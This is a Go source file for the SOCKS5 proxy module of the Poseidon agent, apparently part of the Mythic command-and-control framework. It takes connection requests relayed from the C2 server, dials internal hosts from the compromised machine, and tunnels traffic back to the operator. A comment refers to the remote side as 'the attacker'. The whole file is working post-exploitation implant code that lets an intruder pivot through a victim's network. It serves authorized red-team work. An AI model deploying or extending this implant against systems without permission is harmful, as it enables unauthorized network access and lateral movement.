package socks

import (
	// Standard
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// ****** The following is from https://github.com/armon/go-socks5 *****
const (
	ConnectCommand = uint8(1)
	ipv4Address    = uint8(1)
	fqdnAddress    = uint8(3)
	ipv6Address    = uint8(4)
	NoAuth         = uint8(0)
	socks5Version  = uint8(5)
)

var (
	unrecognizedAddrType = fmt.Errorf("Unrecognized address type")
)

const (
	SuccessReply uint8 = iota
	ServerFailure
	RuleFailure
	NetworkUnreachable
	HostUnreachable
	ConnectionRefused
	TtlExpired
	CommandNotSupported
	AddrTypeNotSupported
)

type Request struct {
	// Protocol version
	Version uint8
	// Requested command
	Command uint8
	// AuthContext provided during negotiation
	AuthContext *AuthContext
	// AddrSpec of the the network that sent the request
	RemoteAddr *AddrSpec
	// AddrSpec of the desired destination
	DestAddr *AddrSpec
	BufConn  io.Reader
}
type AuthContext struct {
	// Provided auth method
	Method uint8
	// Payload provided during negotiation.
	// Keys depend on the used auth method.
	// For UserPassauth contains Username
	Payload map[string]string
}
type AddrSpec struct {
	FQDN string
	IP   net.IP
	Port int
}

// ***** ends section from https://github.com/armon/go-socks5 ********
type socksTracker struct {
	Channel    chan structs.SocksMsg
	Connection net.Conn
}
type mutexMap struct {
	sync.RWMutex
	m map[uint32]socksTracker
}
type Args struct {
	Action string `json:"action"`
	Port   int    `json:"port"`
}

var client = &net.TCPAddr{IP: []byte{127, 0, 0, 1}, Port: 65432}
var channelMap = mutexMap{m: make(map[uint32]socksTracker)}

type addToMap struct {
	ChannelID  uint32
	Connection net.Conn
	NewChannel chan structs.SocksMsg
}

var addToMapChan = make(chan addToMap)
var removeFromMapChan = make(chan uint32, 100)

// var sendToMapChan = make(chan structs.SocksMsg)
var startedGoRoutines = false

func Run(task structs.Task) {
	args := Args{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if !startedGoRoutines {
		//go readFromMythic(profiles.FromMythicSocksChannel, profiles.ToMythicSocksChannel)
		go handleMutexMapModifications()
		startedGoRoutines = true
	}
	if err != nil {
		errResp := structs.Response{}
		errResp.Completed = false
		errResp.TaskID = task.TaskID
		errResp.Status = "error"
		errResp.UserOutput = err.Error()
		task.Job.SendResponses <- errResp
		return
	}
	resp := structs.Response{}
	if args.Action == "start" {
		closeAllChannels()

		resp.UserOutput = "Socks started"
		resp.Completed = true
		resp.TaskID = task.TaskID
	} else {
		closeAllChannels()
		resp.UserOutput = "Socks stopped"
		resp.Completed = true
		resp.TaskID = task.TaskID
	}
	task.Job.SendResponses <- resp

}
func closeAllChannels() {
	ids := make([]uint32, len(channelMap.m))
	channelMap.RLock()
	i := 0
	for k := range channelMap.m {
		ids[i] = k
		i++
	}
	channelMap.RUnlock()
	for _, id := range ids {
		removeFromMapChan <- id
	}
	/*
		for k, v := range channelMap.m {
			closeMsg := structs.SocksMsg{ServerId: k, Exit: true, Data: ""}
			v.Channel <- closeMsg
		}
		channelMap.RUnlock()

	*/
}
func handleMutexMapModifications() {
	for {
		select {
		case msg := <-addToMapChan:
			channelMap.m[msg.ChannelID] = socksTracker{
				Channel:    msg.NewChannel,
				Connection: msg.Connection,
			}
		case msg := <-removeFromMapChan:
			if _, ok := channelMap.m[msg]; ok {
				close(channelMap.m[msg].Channel)
				channelMap.m[msg].Connection.Close()
				delete(channelMap.m, msg)
				//fmt.Printf("Removed channel (%d) from map, now length %d\n", msg, len(channelMap.m))
			}
		case msg := <-profiles.FromMythicSocksChannel:
			if _, ok := channelMap.m[msg.ServerId]; ok {
				select {
				case channelMap.m[msg.ServerId].Channel <- msg:
				case <-time.After(1 * time.Second):
					//fmt.Printf("dropping data because channel is full")
				}
			} else if !msg.Exit {
				data, err := base64.StdEncoding.DecodeString(msg.Data)
				if err != nil {
					//fmt.Printf("Failed to decode message")
					continue
				}
				go connectToProxy(profiles.FromMythicSocksChannel, msg.ServerId, profiles.ToMythicSocksChannel, data)
			}
		}
	}
}

/*
	func readFromMythic(fromMythicSocksChannel chan structs.SocksMsg, toMythicSocksChannel chan structs.SocksMsg) {
		for {
			//fmt.Printf("len of fromMythicSocksChannel: %d\n", len(fromMythicSocksChannel))
			curMsg := <-fromMythicSocksChannel
			//fmt.Printf("just got a message from fromMythicSocksChannel\n")

			//now we have a message, process it
			//fmt.Println("about to lock in mythic read")
			data, err := base64.StdEncoding.DecodeString(curMsg.Data)
			if err != nil {
				//fmt.Printf("Failed to decode message")
				continue
			}
			// when we take the lock, release if we don't have the current id present
			channelMap.RLock()
			_, ok := channelMap.m[curMsg.ServerId]
			channelMap.RUnlock()
			//fmt.Println("just unlocked in mythic read")
			if !ok {
				//
				// we don't have this connection registered, spin off new channel
				if curMsg.Exit {
					//fmt.Printf("don't have channel %d, but mythic said exit, just continue loop\n", curMsg.ServerId)
					//we don't have an open connection and mythic is telling us to close it, just break and continue
					continue
				}
				//fmt.Printf("about to add to mutex map\n")
				//fmt.Printf("opening new proxy connection\n")
				go connectToProxy(fromMythicSocksChannel, curMsg.ServerId, toMythicSocksChannel, data)
				//fmt.Printf("connected to proxy with new connection")
			} else {
				// we already have an opened connection, send data to this channel
				if curMsg.Exit {
					//fmt.Printf("connection exists (%d), but got an exit message, removing mutex\n", curMsg.ServerId)
					//removeMutexMap(curMsg.ServerId, nil)
					continue
				}
				//fmt.Printf("connection exists, sending data to channel (%d) for proxy write %d\n", curMsg.ServerId, len(curMsg.Data))
				channelMap.RLock()
				if thisSocks, ok := channelMap.m[curMsg.ServerId]; ok {
					select {
					case thisSocks.Channel <- curMsg:
					case <-time.After(1 * time.Second):
						//fmt.Printf("dropping data because channel is full")
					}
				}
				channelMap.RUnlock()
			}

		}
	}
*/
func connectToProxy(fromMythicSocksChannel chan structs.SocksMsg, channelId uint32, toMythicSocksChannel chan structs.SocksMsg, data []byte) {
	r := bytes.NewReader(data)
	////fmt.Printf("got connect request: %v, %v\n", data, channelId)
	header := []byte{0, 0, 0}
	if _, err := r.Read(header); err != nil {
		bytesToSend := SendReply(nil, ServerFailure, nil)
		msg := structs.SocksMsg{}
		msg.ServerId = channelId
		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
		msg.Exit = true
		toMythicSocksChannel <- msg
		//fmt.Printf("Telling mythic locally to exit channel in connectToProxy %d, exit going back to mythic too\n", channelId)
		//fromMythicSocksChannel <- msg
		//removeMutexMap(channelId, nil)
		return
	}
	// Ensure we are compatible
	if header[0] != uint8(5) {
		//fmt.Printf("new channel id (%d) with bad header: %v\n", channelId, header)
		msg := structs.SocksMsg{}
		msg.ServerId = channelId
		msg.Data = ""
		msg.Exit = true
		toMythicSocksChannel <- msg
		//fmt.Printf("Telling mythic locally to exit channel %d from bad headers, exit going back to mythic too\n", channelId)
		//fromMythicSocksChannel <- msg
		//removeMutexMap(channelId, nil)
		return
	}
	// Read in the destination address
	//fmt.Printf("%v\n", r)
	dest, err := ReadAddrSpec(r)
	if err != nil {
		//fmt.Printf("Failed to read addr spec: %v, len: %d\n", err, len(data))
		bytesToSend := SendReply(nil, AddrTypeNotSupported, nil)
		msg := structs.SocksMsg{}
		msg.ServerId = channelId
		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
		msg.Exit = true
		toMythicSocksChannel <- msg
		//fmt.Printf("Telling mythic locally to exit channel %d from bad address, exit going back to mythic too\n", channelId)
		//fromMythicSocksChannel <- msg
		//removeMutexMap(channelId, nil)
		return
	}

	request := &Request{
		Version:  uint8(5),
		Command:  header[1],
		DestAddr: dest,
		BufConn:  r,
	}
	request.AuthContext = &AuthContext{NoAuth, nil}
	//fmt.Printf("created auth context\n")
	// this remote addr is for the attacker, which doesn't matter

	request.RemoteAddr = &AddrSpec{IP: client.IP, Port: client.Port}
	if request.DestAddr.FQDN != "" {
		//fmt.Printf("about to resolve fqdn\n")
		addr, err := net.ResolveIPAddr("ip", request.DestAddr.FQDN)
		if err != nil {
			bytesToSend := SendReply(nil, HostUnreachable, nil)
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
			msg.Exit = true
			toMythicSocksChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d from unresolved fqdn, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- msg
			//fmt.Printf("Failed to resolve destination '%v': %v\n", dest.FQDN, err)
			//removeMutexMap(channelId, nil)
			return
		}
		//fmt.Printf("got an IP address\n")
		request.DestAddr.IP = addr.IP
	}
	//fmt.Printf("switching on the request.Command value\n")
	switch request.Command {
	case ConnectCommand:
		// Attempt to connect
		//fmt.Printf("in command switch, got connect command for channel %d\n", channelId)
		target, err := net.Dial("tcp", request.DestAddr.Address())
		//fmt.Printf("channel (%d) connected to remote tcp with err: %v\n", channelId, err)
		if err != nil {
			errorMsg := err.Error()
			resp := HostUnreachable
			if strings.Contains(errorMsg, "refused") {
				resp = ConnectionRefused
			} else if strings.Contains(errorMsg, "network is unreachable") {
				resp = NetworkUnreachable
			}
			bytesToSend := SendReply(nil, resp, nil)
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
			msg.Exit = true
			toMythicSocksChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d from bad command, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- msg
			//fmt.Printf("Connect to %v failed: %v\n", request.DestAddr, errorMsg)
			//removeMutexMap(channelId, nil)
			return
		}
		// send successful connect message
		local := target.LocalAddr().(*net.TCPAddr)
		bind := AddrSpec{IP: local.IP, Port: local.Port}
		bytesToSend := SendReply(nil, SuccessReply, &bind)
		msg := structs.SocksMsg{}
		msg.ServerId = channelId
		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
		msg.Exit = false
		//fmt.Printf("adding to mutex map\n")

		recvChan := make(chan structs.SocksMsg, 200)
		addToMapChan <- addToMap{
			ChannelID:  channelId,
			Connection: target,
			NewChannel: recvChan,
		}
		//addMutexMap(channelId, target, recvChan)
		//fmt.Printf("channel (%d) Sending %v\n", channelId, len(msg.Data))
		toMythicSocksChannel <- msg
		//fmt.Printf("spinning off writeToProxy and readFromProxy routines for (%d)\n", channelId)
		go writeToProxy(recvChan, target, channelId, toMythicSocksChannel)
		go readFromProxy(target, toMythicSocksChannel, channelId)
	default:
		//fmt.Printf("In command switch, hit default case\n")
		bytesToSend := SendReply(nil, CommandNotSupported, nil)
		msg := structs.SocksMsg{}
		msg.ServerId = channelId
		msg.Data = base64.StdEncoding.EncodeToString(bytesToSend)
		msg.Exit = true
		toMythicSocksChannel <- msg
		//fmt.Printf("Telling mythic locally to exit channel %d from default command case, exit going back to mythic too\n", channelId)
		//fromMythicSocksChannel <- msg
		//fmt.Printf("Unsupported command: %v, %v\n", request.Command, channelId)
		//removeMutexMap(channelId, nil)
		return
	}
	//fmt.Printf("Returning from creating new proxy connection\n")
}
func readFromProxy(conn net.Conn, toMythicSocksChannel chan structs.SocksMsg, channelId uint32) {
	for {
		bufIn := make([]byte, 4096)
		// Read the incoming connection into the buffer.
		//conn.SetReadDeadline(time.Now().Add(5 * time.Second))
		//fmt.Printf("channel (%d) waiting to read from proxy address\n", channelId)
		totalRead, err := conn.Read(bufIn)
		//fmt.Printf("channel (%d) totalRead from proxy: %d\n", channelId, totalRead)

		if err != nil {
			//fmt.Println("Error reading from remote proxy: ", err.Error())
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			toMythicSocksChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d from bad proxy read, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- msg
			//conn.Close()
			//fmt.Printf("closing from bad proxy read: %v, %v\n", err.Error(), channelId)
			//go removeMutexMap(channelId)
			removeFromMapChan <- channelId
			return
		}
		//fmt.Printf("Channel (%d) Got %d bytes from proxy\n", channelId, totalRead)
		if totalRead > 0 {
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = base64.StdEncoding.EncodeToString(bufIn[:totalRead])
			msg.Exit = false
			toMythicSocksChannel <- msg
		}
	}
}
func writeToProxy(recvChan chan structs.SocksMsg, conn net.Conn, channelId uint32, toMythicSocksChannel chan structs.SocksMsg) {
	w := bufio.NewWriter(conn)
	for bufOut := range recvChan {
		// Send a response back to person contacting us.
		//fmt.Printf("writeToProxy wants to send %d bytes\n", len(bufOut.Data))
		if bufOut.Exit {
			// got a message from mythic that says to exit
			//fmt.Printf("channel (%d) got exit message from Mythic\n", channelId)
			w.Flush()
			//fmt.Printf("Telling mythic locally to exit channel %d, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- bufOut
			//conn.Close()
			//go removeMutexMap(channelId)
			removeFromMapChan <- channelId
			return
		}
		data, err := base64.StdEncoding.DecodeString(bufOut.Data)
		if err != nil {
			//fmt.Printf("Bad base64 data received\n")
			w.Flush()
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			//fmt.Printf("Telling mythic locally to exit channel %d, bad base64 data, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- msg
			//conn.Close()
			//go removeMutexMap(channelId)
			removeFromMapChan <- channelId
			return
		}
		_, err = w.Write(data)
		if err != nil {
			fmt.Println("channel (%d) Error writing to proxy: ", channelId, err.Error())
			msg := structs.SocksMsg{}
			msg.ServerId = channelId
			msg.Data = ""
			msg.Exit = true
			toMythicSocksChannel <- msg
			//fmt.Printf("Telling mythic locally to exit channel %d bad write to proxy, exit going back to mythic too\n", channelId)
			//fromMythicSocksChannel <- msg
			//fmt.Printf("told mythic to exit channel %d through fromMythicSocksChannel <- msg\n", channelId)
			//conn.Close()
			//fmt.Printf("channel (%d) closing from bad proxy write\n", channelId)
			//go removeMutexMap(channelId)
			removeFromMapChan <- channelId
			return
		}
		w.Flush()
		////fmt.Printf("total written to proxy: %d\n", totalWritten)
	}
	w.Flush()
	//fmt.Printf("channel (%d) proxy connection for writing closed\n", channelId)
	msg := structs.SocksMsg{}
	msg.ServerId = channelId
	msg.Data = ""
	msg.Exit = true
	//fmt.Printf("Telling mythic locally to exit channel %d proxy writing go routine exiting, exit going back to mythic too\n", channelId)
	//fromMythicSocksChannel <- msg
	//conn.Close()
	//go removeMutexMap(channelId)
	removeFromMapChan <- channelId
	return
}

// ****** The following is from https://github.com/armon/go-socks5 *****
func ReadAddrSpec(r io.Reader) (*AddrSpec, error) {
	d := &AddrSpec{}

	// Get the address type
	addrType := []byte{0}
	if _, err := r.Read(addrType); err != nil {
		return nil, err
	}

	// Handle on a per type basis
	//fmt.Printf("addr type case: %v\n", addrType[0])
	switch addrType[0] {
	case ipv4Address:
		addr := make([]byte, 4)
		if _, err := io.ReadAtLeast(r, addr, len(addr)); err != nil {
			return nil, err
		}
		d.IP = net.IP(addr)

	case ipv6Address:
		addr := make([]byte, 16)
		if _, err := io.ReadAtLeast(r, addr, len(addr)); err != nil {
			return nil, err
		}
		d.IP = net.IP(addr)

	case fqdnAddress:
		if _, err := r.Read(addrType); err != nil {
			return nil, err
		}
		addrLen := int(addrType[0])
		fqdn := make([]byte, addrLen)
		if _, err := io.ReadAtLeast(r, fqdn, addrLen); err != nil {
			return nil, err
		}
		d.FQDN = string(fqdn)

	default:
		return nil, unrecognizedAddrType
	}

	// Read the port
	port := []byte{0, 0}
	if _, err := io.ReadAtLeast(r, port, 2); err != nil {
		return nil, err
	}
	d.Port = (int(port[0]) << 8) | int(port[1])

	return d, nil
}
func (a AddrSpec) Address() string {
	if 0 != len(a.IP) {
		return net.JoinHostPort(a.IP.String(), strconv.Itoa(a.Port))
	}
	return net.JoinHostPort(a.FQDN, strconv.Itoa(a.Port))
}
func SendReply(w io.Writer, resp uint8, addr *AddrSpec) []byte {
	// Format the address
	var addrType uint8
	var addrBody []byte
	var addrPort uint16
	switch {
	case addr == nil:
		addrType = ipv4Address
		addrBody = []byte{0, 0, 0, 0}
		addrPort = 0

	case addr.FQDN != "":
		addrType = fqdnAddress
		addrBody = append([]byte{byte(len(addr.FQDN))}, addr.FQDN...)
		addrPort = uint16(addr.Port)

	case addr.IP.To4() != nil:
		addrType = ipv4Address
		addrBody = []byte(addr.IP.To4())
		addrPort = uint16(addr.Port)

	case addr.IP.To16() != nil:
		addrType = ipv6Address
		addrBody = []byte(addr.IP.To16())
		addrPort = uint16(addr.Port)

	default:
		//fmt.Printf("Failed to format address: %v\n", addr)
		return []byte{0}
	}

	// Format the message
	msg := make([]byte, 6+len(addrBody))
	msg[0] = socks5Version
	msg[1] = resp
	msg[2] = 0 // Reserved
	msg[3] = addrType
	copy(msg[4:], addrBody)
	msg[4+len(addrBody)] = byte(addrPort >> 8)
	msg[4+len(addrBody)+1] = byte(addrPort & 0xff)

	// Send the message
	//_, err := w.Write(msg)
	return msg
}

// ***** ends section from https://github.com/armon/go-socks5 ********
